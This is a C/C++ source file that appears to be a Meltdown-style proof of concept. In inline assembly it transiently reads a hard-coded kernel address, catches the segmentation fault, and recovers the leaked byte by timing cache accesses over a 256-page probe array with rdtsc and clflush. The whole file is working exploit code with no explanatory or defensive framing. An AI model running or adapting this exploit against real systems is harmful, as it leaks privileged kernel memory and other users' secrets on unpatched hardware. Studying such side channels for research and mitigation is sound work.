#include <stdio.h>
#include <stdlib.h>
#include <signal.h>

char* data;

unsigned long probe(char* addr)
{
    volatile unsigned long time;
    asm __volatile__(" mfence                   \n"
                     " lfence                   \n"
                     " rdtsc                    \n"
                     " lfence                   \n"
                     " mov esi, eax             \n"
                     " mov eax, DWORD PTR [%1]  \n"
                     " lfence                   \n"
                     " rdtsc                    \n"
                     " sub eax, esi             \n"
                     " clflush [%1]             \n"
                     : "=a"(time)
                     : "c"(addr)
                     : "esi", "edx");
    return time;
}


static void handler(int sig, siginfo_t* si, void* unused)
{
    printf("Got SIGSEGV at address: 0x%lx\n", (long)si->si_addr);
    
    unsigned long result[256];
    
    for (int i = 0; i < 256; ++i)
        result[i] = probe(&data[i * 4096]);

    for (int i = 0; i < 256; ++i)
        printf("Index: %d Time: %d\n", i, result[i]);
    
    exit(1);
}

int main(int argc, char* argv[])
{
    data = new char[256 * 4096];
    char* test = new char[256];
    for(int i = 0; i < 256; ++i)
        test[i] = i;

    // Register segfault handler
    struct sigaction sa;
    sa.sa_flags = SA_SIGINFO | SA_NODEFER;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = handler;
    if (sigaction(SIGSEGV, &sa, NULL) == -1) {
        printf("Failed to register sig handler");
        exit(1);
     }
    
    
    
    // std::cout <<argv[1]<< std::endl;
    // uint8_t* addr = reinterpret_cast<uint8_t*>(strtol(argv[1], NULL, 0));
    char* addr = reinterpret_cast<char*>(0xffff880000000040);
    //char* addr = &test[144];

    // Access data without permission adn trigger exception
    asm __volatile__("mov rax, 0 \n"
                     "retry:  \n"
                     "mov al, BYTE PTR [%0] \n"
                     "shl rax, 0xc \n"
                     "jz retry \n"
                     "mov rbx, QWORD PTR [%1 + rax] \n"
                     :
                     : "r"(addr), "r"(data)
                     : "rax", "rbx");
    
    // Never gets called if addr is not in a valid range
    unsigned long result[256];

    for (int i = 0; i < 256; ++i)
        result[i] = probe(&data[i * 4096]);

    for (int i = 0; i < 256; ++i)
        printf("Index: %d Time: %d\n", i, result[i]);
  
    return 0;
}
